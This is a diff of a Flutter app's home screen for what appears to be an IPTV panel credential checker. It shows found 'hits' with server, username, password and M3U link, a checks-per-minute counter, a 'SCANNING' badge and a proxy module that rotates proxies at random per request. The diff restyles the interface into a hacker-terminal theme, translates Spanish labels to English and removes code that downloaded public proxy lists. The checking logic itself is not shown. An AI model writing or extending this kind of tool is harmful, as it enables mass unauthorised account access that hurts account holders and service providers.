+        decoration: BoxDecoration(
+          color: Colors.black.withOpacity(0.3),
+          borderRadius: BorderRadius.circular(2),
+          border: Border.all(color: cBr),
+        ),
+        child: h.panelInfo == null
           ? Row(children: [
-              SizedBox(width: 14, height: 14,
-                child: CircularProgressIndicator(strokeWidth: 2,
+              SizedBox(width: 12, height: 12,
+                child: CircularProgressIndicator(strokeWidth: 1.5,
                   valueColor: const AlwaysStoppedAnimation(cG))),
-              const SizedBox(width: 10),
-              const Text('Verificando panel...', style: TextStyle(fontSize: 10, color: cDg)),
+              const SizedBox(width: 8),
+              Text('// scanning panel resources...',
+                style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
             ])
           : Row(children: [
-              Expanded(child: _pbox(_fn(h.panelInfo!.live), '📺 CANALES', cG)),
-              const SizedBox(width: 6),
-              Expanded(child: _pbox(_fn(h.panelInfo!.vod), '🎬 VOD', cCy)),
-              const SizedBox(width: 6),
-              Expanded(child: _pbox(_fn(h.panelInfo!.series), '📺 SERIES', cMg)),
+              Expanded(child: _panelStat('LIVE', _fn(h.panelInfo!.live), cG)),
+              Container(width: 1, height: 30, color: cBr),
+              Expanded(child: _panelStat('VOD', _fn(h.panelInfo!.vod), cCy)),
+              Container(width: 1, height: 30, color: cBr),
+              Expanded(child: _panelStat('SER', _fn(h.panelInfo!.series), cMg)),
             ]),
-      ])),
-      Container(
-        margin: const EdgeInsets.symmetric(horizontal: 14),
-        height: 1,
-        color: cG.withOpacity(0.06),
       ),
-      Padding(padding: const EdgeInsets.fromLTRB(14, 8, 14, 12), child: Row(children: [
-        Expanded(child: _sbtn('📋 COPIAR', c: cCy, onTap: () {
-          var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}\nCONEX: ${h.activ}/${h.conex}';
-          if (h.panelInfo != null) t += '\nCANALES: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSERIES: ${h.panelInfo!.series}';
+      // Actions
+      Padding(padding: const EdgeInsets.fromLTRB(12, 8, 12, 10), child: Row(children: [
+        Expanded(child: _miniBtn('COPY', c: cCy, onTap: () {
+          var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}';
+          if (h.panelInfo != null) t += '\nLIVE: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSERIES: ${h.panelInfo!.series}';
           t += '\nM3U: ${h.m3u}';
           Clipboard.setData(ClipboardData(text: t));
-          _toast('✓ Copiado');
+          _toast('COPIED TO CLIPBOARD');
         })),
-        const SizedBox(width: 6),
-        Expanded(child: _sbtn('📺 M3U', c: cG, onTap: () {
+        const SizedBox(width: 5),
+        Expanded(child: _miniBtn('M3U', c: cG, onTap: () {
           Clipboard.setData(ClipboardData(text: h.m3u));
-          _toast('✓ M3U copiado');
+          _toast('M3U COPIED');
         })),
-        const SizedBox(width: 6),
-        _sbtn('🔄', c: cMg, onTap: () async {
+        const SizedBox(width: 5),
+        _miniBtn('↺', c: cMg, onTap: () async {
           setState(() => h.panelInfo = null);
           final info = await verifyPanel(h.panel, h.username, h.password);
           setState(() => h.panelInfo = info);
-          _toast('✓ Panel verificado');
+          _toast('PANEL RESCANNED');
         }),
       ])),
     ]),
   );
 
-  final _proxyUrls = {
-    'ProxiScrape HTTP': 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt',
-    'TheSpeedX HTTP': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-    'TheSpeedX SOCKS4': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
-    'TheSpeedX SOCKS5': 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
-    'Clarketm Lista': 'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
-    'MuRongPIG HTTP': 'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
-    'MuRongPIG SOCKS5': 'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt',
-  };
-
-  bool _downloading = false;
-  final _customUrlCtrl = TextEditingController();
-
-  Future<void> _downloadProxies(String url) async {
-    setState(() => _downloading = true);
-    _toast('⌛ Descargando proxies...');
-    try {
-      final req = await _client.getUrl(Uri.parse(url));
-      req.headers.set('User-Agent', _ua());
-      final res = await req.close().timeout(const Duration(seconds: 15));
-      final body = await res.transform(utf8.decoder).join();
-      final lines = body.split('\n')
-        .map((l) => l.trim())
-        .where((l) => l.isNotEmpty && l.contains(':'))
-        .toList();
-      setState(() {
-        _proxies.clear();
-        _proxies.addAll(lines);
-        _downloading = false;
-      });
-      _toast('✓ \${lines.length} proxies descargados');
-    } catch (e) {
-      setState(() => _downloading = false);
-      _toast('⚠ Error descargando proxies');
-    }
-  }
-
+  // ═══ PROXY TAB ═══
   Widget _proxyTab() => ListView(padding: const EdgeInsets.all(10), children: [
-    _card(ac: cMg, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-      _ct('FUENTES ONLINE'),
-      ..._proxyUrls.entries.map((e) => GestureDetector(
-        onTap: () => _downloadProxies(e.value),
-        child: Container(
-          margin: const EdgeInsets.only(bottom: 6),
-          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
-          decoration: BoxDecoration(
-            color: cMg.withOpacity(0.05),
-            borderRadius: BorderRadius.circular(5),
-            border: Border.all(color: cMg.withOpacity(0.25)),
-          ),
-          child: Row(children: [
-            Container(width: 8, height: 8, decoration: const BoxDecoration(
-              shape: BoxShape.circle, color: cMg,
-              boxShadow: [BoxShadow(color: cMg, blurRadius: 4)],
-            )),
-            const SizedBox(width: 10),
-            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-              Text(e.key, style: const TextStyle(color: cMg, fontSize: 12, fontWeight: FontWeight.bold)),
-              Text(e.value.replaceAll('https://raw.githubusercontent.com/', 'github:'), 
-                style: TextStyle(color: cDg.withOpacity(0.7), fontSize: 8),
-                overflow: TextOverflow.ellipsis),
-            ])),
-            _downloading
-              ? const SizedBox(width: 16, height: 16,
-                  child: CircularProgressIndicator(strokeWidth: 2, color: cMg))
-              : const Icon(Icons.download, color: cMg, size: 18),
-          ]),
-        ),
-      )),
-    ])),
-    _card(ac: cCy, child: Column(children: [
-      _ct('URL PERSONALIZADA'),
-      TextField(
-        controller: _customUrlCtrl,
-        style: const TextStyle(color: cG, fontSize: 11, fontFamily: 'monospace'),
-        decoration: InputDecoration(
-          hintText: 'https://mi-lista.com/proxies.txt',
-          hintStyle: TextStyle(color: cDg.withOpacity(0.6), fontSize: 11),
-          filled: true, fillColor: Colors.black54,
-          prefixIcon: const Icon(Icons.link, color: cDg, size: 16),
-          border: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
-          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
-          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cG, width: 1.5)),
-          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
-        ),
-      ),
-      const SizedBox(height: 8),
-      _btn('⬇ DESCARGAR DE URL', c: cCy, onTap: () {
-        final url = _customUrlCtrl.text.trim();
-        if (url.isEmpty) { _toast('⚠ Ingresa una URL'); return; }
-        _downloadProxies(url);
-      }),
-    ])),
-    _card(ac: cYe, child: Column(children: [
-      _ct('ARCHIVO LOCAL'),
-      _btn('📂 CARGAR ARCHIVO .TXT', c: cYe, onTap: _loadProxies),
-    ])),
-    _card(child: Column(children: [
-      _ct('ESTADO'),
-      _prow('TOTAL CARGADOS', '${_proxies.length}', cG),
-      _prow('MODO', _proxies.isEmpty ? 'Directo' : 'Con proxies', _proxies.isEmpty ? cDg : cG),
-      _prow('PROTOCOLO', 'HTTP/SOCKS4/SOCKS5', cDg),
-      const SizedBox(height: 8),
-      _btn('✗ LIMPIAR PROXIES', c: cRe, onTap: () => setState(() => _proxies.clear())),
+    _termBox(child: Column(children: [
+      _termTitle('> PROXY MODULE'),
+      const SizedBox(height: 10),
+      _hackerBtn('📂 LOAD PROXY LIST', c: cMg, onTap: _loadProxies),
+      const SizedBox(height: 10),
+      _credRow('LOADED', '${_proxies.length} proxies', cG),
+      _credRow('MODE', _proxies.isEmpty ? 'DIRECT' : 'PROXY', _proxies.isEmpty ? cDg : cG),
+      _credRow('ROTATION', 'RANDOM PER REQUEST', cDg),
+      if (_proxies.isNotEmpty) ...[
+        const SizedBox(height: 8),
+        _hackerBtn('[ CLEAR ]', c: cRe, onTap: () => setState(() => _proxies.clear())),
+      ],
     ])),
   ]);
 
-  Widget _rbadge() => AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
-    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
+  // ═══ HELPERS ═══
+  Widget _termBox({required Widget child}) => Container(
+    margin: const EdgeInsets.only(bottom: 10),
+    padding: const EdgeInsets.all(12),
     decoration: BoxDecoration(
-      color: cG.withOpacity(0.08),
-      borderRadius: BorderRadius.circular(20),
-      border: Border.all(color: cG.withOpacity(0.3)),
-      boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value * 0.2), blurRadius: 10)],
+      color: cBg2.withOpacity(0.88),
+      borderRadius: BorderRadius.circular(2),
+      border: Border.all(color: cG.withOpacity(0.2)),
+      boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 15)],
+    ),
+    child: child,
+  );
+
+  Widget _termTitle(String t) => Row(children: [
+    Container(width: 2, height: 12, color: cG, margin: const EdgeInsets.only(right: 8)),
+    Text(t, style: const TextStyle(fontSize: 10, color: cG,
+      fontFamily: 'monospace', letterSpacing: 2, fontWeight: FontWeight.bold,
+      shadows: [Shadow(color: cG, blurRadius: 6)])),
+  ]);
+
+  Widget _rbadge() => AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
+    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+    decoration: BoxDecoration(
+      color: cG.withOpacity(0.06),
+      borderRadius: BorderRadius.circular(2),
+      border: Border.all(color: cG.withOpacity(0.4)),
+      boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value * 0.25), blurRadius: 12)],
     ),
     child: Row(mainAxisSize: MainAxisSize.min, children: [
       Container(width: 6, height: 6, decoration: BoxDecoration(
@@ -1152,195 +1215,130 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
         boxShadow: [BoxShadow(color: cG.withOpacity(_pulse.value), blurRadius: 8)],
       )),
       const SizedBox(width: 6),
-      const Text('ESCANEANDO', style: TextStyle(fontSize: 9, color: cG, letterSpacing: 2, fontWeight: FontWeight.bold)),
+      const Text('SCANNING', style: TextStyle(fontSize: 9, color: cG,
+        letterSpacing: 3, fontWeight: FontWeight.bold, fontFamily: 'monospace',
+        shadows: [Shadow(color: cG, blurRadius: 8)])),
     ]),
   ));
 
-  Widget _sbox(String label, String val, Color c) => Container(
-    padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
-    decoration: BoxDecoration(
-      color: c.withOpacity(0.05),
-      borderRadius: BorderRadius.circular(6),
-      border: Border.all(color: c.withOpacity(0.25)),
-      boxShadow: [BoxShadow(color: c.withOpacity(0.08), blurRadius: 10)],
-    ),
-    child: Column(children: [
-      Text(val, style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold, color: c,
-        fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 15)])),
-      const SizedBox(height: 3),
-      Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6), letterSpacing: 2)),
-    ]),
-  );
-
-  Widget _cpmBox() => Container(
-    padding: const EdgeInsets.symmetric(vertical: 10),
-    decoration: BoxDecoration(
-      gradient: LinearGradient(colors: [cYe.withOpacity(0.05), cYe.withOpacity(0.1)]),
-      borderRadius: BorderRadius.circular(6),
-      border: Border.all(color: cYe.withOpacity(0.3)),
-      boxShadow: [BoxShadow(color: cYe.withOpacity(0.1), blurRadius: 15)],
-    ),
-    child: Column(children: [
-      AnimatedBuilder(animation: _glow, builder: (_, __) => Text(_fmt(_cpm),
-        style: TextStyle(fontSize: 32, fontWeight: FontWeight.bold, color: cYe,
-          fontFamily: 'monospace', letterSpacing: -1,
-          shadows: [Shadow(color: cYe.withOpacity(_glow.value), blurRadius: 20)]))),
-      Text('CHECKS POR MINUTO', style: TextStyle(fontSize: 8, color: cYe.withOpacity(0.6), letterSpacing: 3)),
-    ]),
-  );
-
-  Widget _card({Color ac = cBr, required Widget child}) => Container(
-    margin: const EdgeInsets.only(bottom: 10),
-    padding: const EdgeInsets.fromLTRB(14, 12, 12, 12),
-    decoration: BoxDecoration(
-      color: cBg2.withOpacity(0.85),
-      borderRadius: BorderRadius.circular(8),
-      border: Border.all(color: cBr),
-      boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 10)],
-    ),
-    child: Stack(children: [
-      Positioned(left: -14, top: -12, bottom: -12, child: Container(width: 3,
-        decoration: BoxDecoration(
-          borderRadius: const BorderRadius.horizontal(left: Radius.circular(8)),
-          gradient: LinearGradient(
-            begin: Alignment.topCenter, end: Alignment.bottomCenter,
-            colors: [ac, ac.withOpacity(0.1)])))),
-      child,
-    ]),
-  );
-
-  Widget _ct(String t) => Padding(padding: const EdgeInsets.only(bottom: 10), child: Row(children: [
-    Container(width: 3, height: 14, color: cG,
-      margin: const EdgeInsets.only(right: 8)),
-    Text(t, style: const TextStyle(fontSize: 11, color: cDg, letterSpacing: 2.5, fontWeight: FontWeight.bold)),
-  ]));
-
-  Widget _sec(String t) => Padding(padding: const EdgeInsets.only(bottom: 8, top: 4), child: Row(children: [
-    Container(width: 4, height: 4, margin: const EdgeInsets.only(right: 8),
-      decoration: const BoxDecoration(shape: BoxShape.circle, color: cG)),
-    Text(t, style: const TextStyle(fontSize: 10, color: cDg, letterSpacing: 3, fontWeight: FontWeight.bold)),
-    const SizedBox(width: 8),
-    Expanded(child: Container(height: 1,
-      decoration: const BoxDecoration(gradient: LinearGradient(colors: [cBr, Colors.transparent])))),
-  ]));
-
-  Widget _btn(String label, {required Color c, required VoidCallback onTap}) => GestureDetector(
-    onTap: onTap,
-    child: Container(
-      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 13),
-      margin: const EdgeInsets.only(bottom: 7),
-      decoration: BoxDecoration(
-        gradient: LinearGradient(colors: [c.withOpacity(0.06), c.withOpacity(0.12)]),
-        borderRadius: BorderRadius.circular(5),
-        border: Border.all(color: c.withOpacity(0.45)),
-        boxShadow: [BoxShadow(color: c.withOpacity(0.12), blurRadius: 12)],
-      ),
-      child: Text(label, textAlign: TextAlign.center,
-        style: TextStyle(color: c, fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 2,
-          shadows: [Shadow(color: c, blurRadius: 10)])),
-    ),
-  );
-
-  Widget _bigBtn(String label, {required VoidCallback onTap}) => GestureDetector(
-    onTap: onTap,
-    child: AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
-      width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 16),
-      decoration: BoxDecoration(
-        gradient: LinearGradient(colors: [
-          const Color(0xFF002208), const Color(0xFF004410), const Color(0xFF002208)]),
-        borderRadius: BorderRadius.circular(6),
-        border: Border.all(color: cG.withOpacity(0.6), width: 1.5),
-        boxShadow: [
-          BoxShadow(color: cG.withOpacity(_glow.value * 0.3), blurRadius: 20),
-          BoxShadow(color: cG.withOpacity(0.1), blurRadius: 40),
-        ],
-      ),
-      child: Text(label, textAlign: TextAlign.center,
-        style: TextStyle(color: cG, fontSize: 15, fontWeight: FontWeight.bold, letterSpacing: 3,
-          shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)])),
-    )),
-  );
-
-  Widget _sbtn(String label, {required Color c, required VoidCallback onTap}) => GestureDetector(
-    onTap: onTap,
-    child: Container(
-      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
-      decoration: BoxDecoration(
-        color: c.withOpacity(0.08),
-        borderRadius: BorderRadius.circular(5),
-        border: Border.all(color: c.withOpacity(0.35)),
-      ),
-      child: Text(label, style: TextStyle(color: c, fontSize: 10,
-        fontWeight: FontWeight.bold, letterSpacing: 1.5)),
-    ),
-  );
-
-  Widget _bdg(String text, Color c) => Container(
-    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
-    decoration: BoxDecoration(
-      color: c.withOpacity(0.1),
-      borderRadius: BorderRadius.circular(3),
-      border: Border.all(color: c.withOpacity(0.25))),
-    child: Text(text, style: TextStyle(fontSize: 9, color: c, letterSpacing: 0.5)),
-  );
-
-  Widget _ibox(String label, String val, Color c) => Container(
-    padding: const EdgeInsets.all(8),
-    decoration: BoxDecoration(
-      color: cBg,
-      borderRadius: BorderRadius.circular(4),
-      border: Border.all(color: cBr),
-    ),
-    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-      Text(label, style: const TextStyle(fontSize: 8, color: cDg, letterSpacing: 1.5)),
-      const SizedBox(height: 3),
-      Text(val, style: TextStyle(fontSize: 11, color: c, fontWeight: FontWeight.bold)),
-    ]),
-  );
-
-  Widget _pbox(String val, String label, Color c) => Container(
+  Widget _statCard(String label, String val, Color c, {bool big = false}) => Container(
     padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 6),
     decoration: BoxDecoration(
       color: c.withOpacity(0.05),
-      borderRadius: BorderRadius.circular(5),
-      border: Border.all(color: c.withOpacity(0.2)),
+      borderRadius: BorderRadius.circular(2),
+      border: Border.all(color: c.withOpacity(0.3)),
+      boxShadow: [BoxShadow(color: c.withOpacity(0.1), blurRadius: 10)],
     ),
     child: Column(children: [
-      Text(val, style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: c,
-        fontFamily: 'monospace', shadows: [Shadow(color: c, blurRadius: 12)])),
+      Text(val, style: TextStyle(
+        fontSize: big ? 24 : 18, fontWeight: FontWeight.bold,
+        color: c, fontFamily: 'monospace',
+        shadows: [Shadow(color: c, blurRadius: 15)])),
       const SizedBox(height: 2),
-      Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.7), letterSpacing: 0.5)),
+      Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6),
+        letterSpacing: 2, fontFamily: 'monospace')),
     ]),
   );
 
-  Widget _prow(String label, String val, Color c) => Padding(
-    padding: const EdgeInsets.symmetric(vertical: 7),
-    child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-      Text(label, style: const TextStyle(fontSize: 10, color: cDg, letterSpacing: 1)),
-      Text(val, style: TextStyle(fontSize: 10, color: c, fontWeight: FontWeight.bold)),
+  Widget _hackerBtn(String label, {required Color c, required VoidCallback onTap}) =>
+    GestureDetector(
+      onTap: onTap,
+      child: Container(
+        width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 13),
+        margin: const EdgeInsets.only(bottom: 5),
+        decoration: BoxDecoration(
+          gradient: LinearGradient(colors: [c.withOpacity(0.05), c.withOpacity(0.12)]),
+          borderRadius: BorderRadius.circular(2),
+          border: Border.all(color: c.withOpacity(0.5)),
+          boxShadow: [BoxShadow(color: c.withOpacity(0.15), blurRadius: 15)],
+        ),
+        child: Text(label, textAlign: TextAlign.center,
+          style: TextStyle(color: c, fontSize: 12, fontWeight: FontWeight.bold,
+            letterSpacing: 3, fontFamily: 'monospace',
+            shadows: [Shadow(color: c, blurRadius: 10)])),
+      ),
+    );
+
+  Widget _miniBtn(String label, {required Color c, required VoidCallback onTap}) =>
+    GestureDetector(
+      onTap: onTap,
+      child: Container(
+        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
+        decoration: BoxDecoration(
+          color: c.withOpacity(0.08),
+          borderRadius: BorderRadius.circular(2),
+          border: Border.all(color: c.withOpacity(0.4)),
+        ),
+        child: Text(label, textAlign: TextAlign.center,
+          style: TextStyle(color: c, fontSize: 10,
+            fontWeight: FontWeight.bold, letterSpacing: 1.5,
+            fontFamily: 'monospace')),
+      ),
+    );
+
+  Widget _credRow(String key, String val, Color c) => Padding(
+    padding: const EdgeInsets.only(bottom: 4),
+    child: Row(children: [
+      Text('$key:', style: TextStyle(fontSize: 10, color: cDg,
+        fontFamily: 'monospace', letterSpacing: 1)),
+      const SizedBox(width: 8),
+      Expanded(child: Text(val, style: TextStyle(fontSize: 10, color: c,
+        fontFamily: 'monospace',
+        shadows: [Shadow(color: c.withOpacity(0.5), blurRadius: 6)]),
+        overflow: TextOverflow.ellipsis)),
     ]),
   );
+
+  Widget _termBadge(String text, Color c) => Container(
+    padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 3),
+    decoration: BoxDecoration(
+      color: c.withOpacity(0.08),
+      borderRadius: BorderRadius.circular(2),
+      border: Border.all(color: c.withOpacity(0.3)),
+    ),
+    child: Text(text, style: TextStyle(fontSize: 9, color: c,
+      fontFamily: 'monospace', letterSpacing: 0.5)),
+  );
+
+  Widget _paramBox(String label, String val, Color c) => Container(
+    padding: const EdgeInsets.all(8),
+    decoration: BoxDecoration(
+      color: c.withOpacity(0.05),
+      borderRadius: BorderRadius.circular(2),
+      border: Border.all(color: c.withOpacity(0.25)),
+    ),
+    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+      Text(label, style: TextStyle(fontSize: 8, color: cDg.withOpacity(0.8),
+        fontFamily: 'monospace', letterSpacing: 1.5)),
+      const SizedBox(height: 3),
+      Text(val, style: TextStyle(fontSize: 11, color: c,
+        fontWeight: FontWeight.bold, fontFamily: 'monospace',
+        shadows: [Shadow(color: c.withOpacity(0.5), blurRadius: 6)])),
+    ]),
+  );
+
+  Widget _panelStat(String label, String val, Color c) => Column(children: [
+    Text(val, style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold,
+      color: c, fontFamily: 'monospace',
+      shadows: [Shadow(color: c, blurRadius: 10)])),
+    Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6),
+      fontFamily: 'monospace', letterSpacing: 1)),
+  ]);
 }
 
 class _ScanLinePainter extends CustomPainter {
-  final double progress;
-  _ScanLinePainter(this.progress);
-
+  final double p;
+  _ScanLinePainter(this.p);
   @override
   void paint(Canvas canvas, Size size) {
-    final y = size.height * progress;
-    final paint = Paint()
-      ..shader = LinearGradient(colors: [
-        Colors.transparent,
-        cG.withOpacity(0.03),
-        cG.withOpacity(0.06),
-        cG.withOpacity(0.03),
-        Colors.transparent,
-      ], stops: const [0, 0.3, 0.5, 0.7, 1]).createShader(
-        Rect.fromLTWH(0, y - 30, size.width, 60));
-    canvas.drawRect(Rect.fromLTWH(0, y - 30, size.width, 60), paint);
+    final y = size.height * p;
+    final paint = Paint()..shader = LinearGradient(colors: [
+      Colors.transparent, cG.withOpacity(0.04), cG.withOpacity(0.08),
+      cG.withOpacity(0.04), Colors.transparent,
+    ], stops: const [0,0.3,0.5,0.7,1]).createShader(
+      Rect.fromLTWH(0, y-40, size.width, 80));
+    canvas.drawRect(Rect.fromLTWH(0, y-40, size.width, 80), paint);
   }
-
   @override
-  bool shouldRepaint(_ScanLinePainter old) => old.progress != progress;
+  bool shouldRepaint(_ScanLinePainter old) => old.p != p;
 }
